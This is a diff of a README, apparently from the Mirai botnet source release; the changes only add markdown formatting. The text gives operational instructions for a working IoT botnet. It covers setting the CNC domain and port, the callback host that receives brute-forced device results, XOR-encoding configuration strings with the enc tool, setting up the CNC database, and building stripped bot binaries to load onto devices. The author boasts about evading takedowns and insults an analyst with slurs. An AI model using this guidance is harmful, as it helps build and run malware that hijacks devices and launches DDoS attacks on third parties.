@@ -15,11 +15,11 @@ https://web.archive.org/web/201609302302...-just.html <- backup in case low qual
 Had a lot of respect for you, thought you were good reverser, but you really just completely and totally failed in reversing this binary. "We still have better kung fu than you kiddos" don't make me laugh please, you made so many mistakes and even confused some different binaries with my. LOL
 
 Let me give you some slaps back -
-1) port 48101 is not for back connect, it is for control to prevent multiple instances of bot running together
-2) /dev/watchdog and /dev/misc are not for "making the delay", it for preventing system from hanging. This one is low-hanging fruit, so sad that you are extremely dumb
-3) You failed and thought FAKE_CNC_ADDR and FAKE_CNC_PORT was real CNC, lol "And doing the backdoor to connect via HTTP on 65.222.202.53". you got tripped up by signal flow ;) try harder skiddo
-4) Your skeleton tool sucks ass, it thought the attack decoder was "sinden style", but it does not even use a text-based protocol? CNC and bot communicate over binary protocol
-5) you say 'chroot("/") so predictable like torlus' but you don't understand, some others kill based on cwd. It shows how out-of-the-loop you are with real malware. Go back to skidland
+- 1) port 48101 is not for back connect, it is for control to prevent multiple instances of bot running together
+- 2) `/dev/watchdog` and `/dev/misc` are not for "making the delay", it for preventing system from hanging. This one is low-hanging fruit, so sad that you are extremely dumb
+- 3) You failed and thought `FAKE_CNC_ADDR` and `FAKE_CNC_PORT` was real CNC, lol "And doing the backdoor to connect via HTTP on 65.222.202.53". you got tripped up by signal flow ;) try harder skiddo
+- 4) Your skeleton tool sucks ass, it thought the attack decoder was "sinden style", but it does not even use a text-based protocol? CNC and bot communicate over binary protocol
+- 5) you say `chroot("/")` so predictable like torlus' but you don't understand, some others kill based on cwd. It shows how out-of-the-loop you are with real malware. Go back to skidland
 
 5 slaps for you
 
@@ -52,12 +52,12 @@ The loader can be configured to use multiple IP address to bypass port exhaustio
 Configuring Bot
 Bot has several configuration options that are obfuscated in (table.c/table.h). In ./mirai/bot/table.h you can find most descriptions for configuration options. However, in ./mirai/bot/table.c there are a few options you *need* to change to get working.
 
-- TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :)
-- TABLE_CNC_PORT - Port to connect to, its set to 23 already
-- TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to
-- TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already.
+- `TABLE_CNC_DOMAIN` - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :)
+- `TABLE_CNC_PORT` - Port to connect to, its set to 23 already
+- `TABLE_SCAN_CB_DOMAIN` - When finding bruted results, this domain it is reported to
+- `TABLE_SCAN_CB_PORT` - Port to connect to for bruted results, it is set to 48101 already.
 
-In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file
+In `./mirai/tools` you will find something called enc.c - You must compile this to output things to put in the table.c file
 
 Run this inside mirai directory
 ```python
@@ -70,10 +70,10 @@ Now, in the ./mirai/debug folder you should see a compiled binary called enc. Fo
 ./debug/enc string fuck.the.police.com
 ```
 The output should look like this
-Code:
+```python
 XOR'ing 20 bytes of data...
 \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22​
-
+```
 To update the TABLE_CNC_DOMAIN value for example, replace that long hex string with the one provided by enc tool. Also, you see "XOR'ing 20 bytes of data". This value must replace the last argument tas well. So for example, the table.c line originally looks like this
 
 ```python
@@ -87,8 +87,9 @@ add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4
 Some values are strings, some are port (uint16 in network order / big endian).
 
 Configuring CNC
-Code:
+```python
 apt-get install mysql-server mysql-client
+```
 CNC requires database to work. When you install database, go into it and run following commands:
 http://pastebin.com/86d0iL9g
 
@@ -127,12 +128,12 @@ In mirai folder, there is build.sh script.
 ```python
 ./build.sh debug telnet
 ```
-Will output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder
+Will output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to `./mirai/debug` folder
 
 ```python
 ./build.sh release telnet
 ```
-Will output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to ./mirai/release folder
+Will output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to `./mirai/release` folder
 
 
 Building Echo Loader
